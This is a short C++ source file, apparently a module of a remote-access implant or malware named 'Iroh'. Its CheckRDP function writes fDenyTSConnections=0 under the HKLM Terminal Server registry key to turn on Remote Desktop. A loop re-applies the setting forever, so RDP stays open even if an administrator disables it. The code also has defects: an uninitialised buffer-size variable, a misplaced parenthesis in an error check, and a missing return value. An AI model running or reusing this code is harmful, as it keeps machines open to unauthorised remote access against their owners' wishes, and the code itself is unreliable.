#include "EnableServices.h"

namespace Iroh {

	EnableServices::EnableServices() : enableRDP(DEFAULT_ENABLERDP), sleepTime(DEFAULT_SLEEPTIMER)
	{ /* No functionality here */ }


	VOID EnableServices::SetEnableRDP(BOOL val) {
		this->enableRDP = val;
	}

	VOID EnableServices::SetSleepTime(INT timeInMilli) {
		this->sleepTime = timeInMilli;
	}

	VOID EnableServices::Start() {

		if (this->sleepTime == 0) {
			this->CheckServices();
		} else {
			this->ServicesLoop();
		}

	}

	VOID EnableServices::ServicesLoop() {
			
		while (TRUE) {
			this->CheckServices();
			Sleep(this->sleepTime);
		}

	}

	VOID EnableServices::CheckServices() {
	
		if (enableRDP)
			this->CheckRDP();
	
	}

	DWORD EnableServices::CheckRDP() {

		//
		// Set up variables
		//
		HKEY hkey;
		DWORD dw;
		DWORD data;

		DWORD valueToChange = 0; // The value to change value to enable RDP

		LPCWSTR valueName(L"fDenyTSConnections");

		long err;

		//
		// Tries to open the reg key
		//
		if ((err = RegOpenKeyEx(
			HKEY_LOCAL_MACHINE,
			L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
			0,
			KEY_READ | KEY_WRITE,
			&hkey)) != ERROR_SUCCESS) {
			return 0;
		}

		//
		// Gets the current value of the key
		//
		if ((err = RegQueryValueEx(
			hkey,
			valueName,
			NULL,
			NULL,
			(LPBYTE)&data,
			&dw) != ERROR_SUCCESS)) {
			RegCloseKey(hkey);
			return 0;
		}

		//
		// If it is not set to zero, it will set it to zero
		//
		if (data == 1) {

			if ((err = RegSetValueEx(
				hkey,
				valueName,
				0,
				REG_DWORD,
				(const BYTE*)&valueToChange,
				sizeof(valueToChange))) != ERROR_SUCCESS) {
				RegCloseKey(hkey);
				return 0;
			}

		}

		RegCloseKey(hkey);

	}

}
